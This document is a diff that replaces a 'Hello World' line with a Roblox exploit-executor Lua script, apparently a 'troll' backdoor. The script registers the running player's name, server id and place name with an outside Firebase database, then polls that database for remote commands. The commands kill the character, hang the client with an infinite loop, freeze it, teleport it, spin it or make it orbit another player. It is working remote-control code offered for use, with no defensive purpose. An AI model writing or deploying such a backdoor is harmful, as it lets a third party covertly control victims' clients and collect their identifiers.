@@ -1,1 +1,126 @@
-print("Hello World")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+-- === FIREBASE URL ===
+local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
+local MY_ROLE = "Target" 
+
+local lastCommandId = ""
+local orbitConnection
+local spasmConnection
+
+local function stopLoops()
+    if orbitConnection then orbitConnection:Disconnect(); orbitConnection = nil end
+    if spasmConnection then spasmConnection:Disconnect(); spasmConnection = nil end
+end
+
+-- 1. FUNGSI AUTO LISTER
+local function registerPlayer()
+    local playerData = {
+        name = LocalPlayer.Name,
+        role = MY_ROLE,
+        gameId = tostring(game.JobId),
+        placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    }
+    
+    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    if request then
+        pcall(function()
+            request({
+                Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json",
+                Method = "PUT",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(playerData)
+            })
+        end)
+    end
+end
+
+-- Hapus data dari Firebase saat keluar game
+Players.PlayerRemoving:Connect(function(player)
+    if player == LocalPlayer then
+        local request = (syn and syn.request) or (http and http.request) or http_request or request
+        if request then
+            request({
+                Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json",
+                Method = "DELETE"
+            })
+        end
+    end
+end)
+
+-- 2. LOGIKA MENERIMA PERINTAH
+local function executeCommand(cmdData)
+    if not cmdData or cmdData.id == lastCommandId then return end
+    lastCommandId = cmdData.id
+    
+    local command = cmdData.command
+    local target = cmdData.target
+    local extra = cmdData.message
+    
+    if target ~= "all" and target ~= LocalPlayer.Name then return end
+    
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    
+    stopLoops()
+    
+    if command == "reset" then
+        if hum then hum.Health = 0 end
+    elseif command == "exit" then
+        while true do end 
+    elseif command == "freeze" then
+        if root then root.Anchored = true end
+    elseif command == "unfreeze" then
+        if root then root.Anchored = false end
+        if hum then hum.WalkSpeed = 16 end
+    elseif command == "tppos" then
+        if root and extra then
+            local coords = {}
+            for coord in string.gmatch(extra, "[^,]+") do table.insert(coords, tonumber(coord)) end
+            if #coords >= 3 then root.CFrame = CFrame.new(coords[1], coords[2], coords[3]) end
+        end
+    elseif command == "spasm" then
+        if hum and root then
+            hum.PlatformStand = true
+            spasmConnection = RunService.Heartbeat:Connect(function()
+                root.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
+            end)
+        end
+    elseif command == "unspasm" then
+        if hum then hum.PlatformStand = false end
+        if root then root.RotVelocity = Vector3.new(0,0,0) end
+    elseif command == "orbit" then
+        local orbitTarget = Players:FindFirstChild(extra)
+        if root and orbitTarget and orbitTarget.Character and orbitTarget.Character:FindFirstChild("HumanoidRootPart") then
+            local targetRoot = orbitTarget.Character.HumanoidRootPart
+            local angle = 0
+            orbitConnection = RunService.Heartbeat:Connect(function()
+                if targetRoot and root then
+                    angle = angle + 0.1
+                    root.CFrame = targetRoot.CFrame * CFrame.Angles(0, angle, 0) * CFrame.new(0, 0, 10)
+                else
+                    stopLoops()
+                end
+            end)
+        end
+    end
+end
+
+-- Jalankan registrasi dan loop pengecekan
+registerPlayer()
+task.spawn(function()
+    while true do
+        pcall(function()
+            local response = game:HttpGet(FIREBASE_URL .. "command.json")
+            if response and response ~= "null" then
+                local data = HttpService:JSONDecode(response)
+                executeCommand(data)
+            end
+        end)
+        task.wait(1.5)
+    end
+end)
